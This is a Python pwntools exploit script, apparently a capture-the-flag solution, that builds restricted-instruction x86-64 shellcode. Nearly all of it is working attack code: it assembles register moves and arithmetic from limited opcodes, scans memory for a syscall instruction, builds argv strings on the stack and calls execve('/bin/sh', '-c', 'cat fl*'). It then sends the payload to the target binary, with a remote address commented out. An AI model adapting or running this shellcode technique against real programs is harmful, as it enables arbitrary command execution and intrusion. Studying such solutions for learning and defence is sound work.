from pwn import *
from instructions import inst


# building blocks
def bp():
    return '\xcc'


def movr(r1, r2):
    """Moves r2 into r1 vis push/pop. """
    return inst['push ' + r2] + inst['pop ' + r1]


def addl(r, imm8):
    """Adds imm8 to the LSB of r.

    If r is rax, the addition is done in-place, otherwise r is moved to rax
    first, then moved back.

    NOTE: this is achieved by approximately imm8 * 3 instructions.
    """
    seq = ''
    for _ in range(imm8):
        seq += inst['stc '] + inst['adc al,0x90'] + inst['sub al,0x90']

    if r != 'rax':
        seq = movr('rax', r) + seq + movr(r, 'rax')

    seq += inst['stc ']
    return seq


def subl(r, imm8):
    """Subtracts imm8 to the lower DW of r.

    If r is rax, the subtraction is done in-place, otherwise r is moved to rax
    first, then moved back.

    NOTE: this is achieved by imm32 * 3 instructions.
    """
    seq = ''
    for _ in range(imm8):
        seq += inst['stc '] + inst['sbb al,0x90'] + inst['add al,0x90']

    seq += inst['clc ']
    if r != 'rax':
        seq = movr('rax', r) + seq + movr(r, 'rax')

    return seq


def add_dw(r, imm32):
    """Adds imm32 to the lower dw of r.

    This gets a bit tricky if we'd like to preserve the higher dw, since the
    adc eax, 0x90909090 instruction zeroes it, as does any operation on the
    lower dw of the x64 registers. I'm not sure how would it be possible to
    avoid this.

    NOTE: don't use this on rsp
    """
    seq = ''
    for _ in range(imm32):
        seq += inst['stc '] + inst['adc eax,0x90909090'] + inst['sub eax,0x90909090']

    seq += inst['clc ']
    if r != 'rax':
        seq = movr('rax', r) + seq + movr(r, 'rax')

    return seq


def find_syscall():
    seq = ''
    seq += movr('rdi', 'rcx')       # scan start, rcx is set by the last syscall invoked
    seq += movr('rax', 'rbp')       # zero rax
    seq += add_dw('rax', 0x0f)      # first hex byte for syscall inst
    seq += inst['nop'] * 10          # padding, so that the jump of the loop is ok
    seq += inst['scas al,BYTE PTR es:[rdi]']
    seq += inst['loopne 0xffffffffffffff92']    # loop until found
    # if the loop falls over, we found the addr of the syscall inst
    # we also trashed rcx in the meantime
    seq += subl('rdi', 1)
    seq += movr('rdx', 'rdi')
    return seq


def build_str(s, offset):
    """Builds string s on the stack with offset difference to the actual rsp."""
    seq = ''
    seq += movr('rdi', 'rbx')   # this is the rsp saved at the very beginning
    seq += addl('rdi', offset)  # add the argv[i] offset
    seq += inst['push rdi']     # also push it to the stack as the argv array

    # this will be the filename arg for the syscall, since we are building
    # argv in reverse order, the last such mov will put the address of '/bin/sh'
    # into rcx
    seq += movr('rcx', 'rdi')
    for c in s:
        seq += movr('rax', 'rbp')   # zero rax
        seq += addl('rax', ord(c))
        seq += inst['stos BYTE PTR es:[rdi],al']

    return seq


binp = './nope-bd5d0849cb50c6a762c85f6962f6a2658da7f72d.elf'
p = process(binp)
# p = remote('35.198.126.67', 4444)
# gdb.attach(p, gdbscript='continue')

cmd = 'echo OK GOOGLE; cat fl*'
argv_str = list(reversed(['/bin/sh\0', '-c\0', cmd + '\0']))


def cumsum(l):
    s = 0
    for i in l:
        yield s
        s += i


argv = zip(argv_str, cumsum(map(len, argv_str)))
print 'arguments and offsets: ', argv

# rax - scratch
# rdx - the location of the executable syscall inst
# rbp - kept at 0 to zero stuff
pl = flat([
    # set the lsb of rsp to something sane and save it
    movr('rax', 'rsp'),
    inst['and al,0x90'],
    movr('rsp', 'rax'),
    movr('rbx', 'rsp'),

    # do the harlem shake
    find_syscall(),
    inst['push rbp'],       # terminator 0 of argv[]
    [build_str(x[0], 16 + x[1]) for x in argv],

    # prepare the execve syscall args
    movr('rdi', 'rcx'),     # execve arg1: after the last build_str calls, rcx points to argv[0]
    movr('rsi', 'rsp'),     # execve arg2: after the build_str calls, rsp points to the argv array
    inst['push rdx'],       # will be used as ret addr at the end
    movr('rdx', 'rbp'),     # execve arg3: zero the envp arg
    movr('rax', 'rbp'),     # calculate syscall
    addl('rax', 59),        # sys_execve

    inst['ret '],
    ])

print hexdump(pl)
p.send(pl)
p.shutdown('write')
print p.recvrepeat(3)
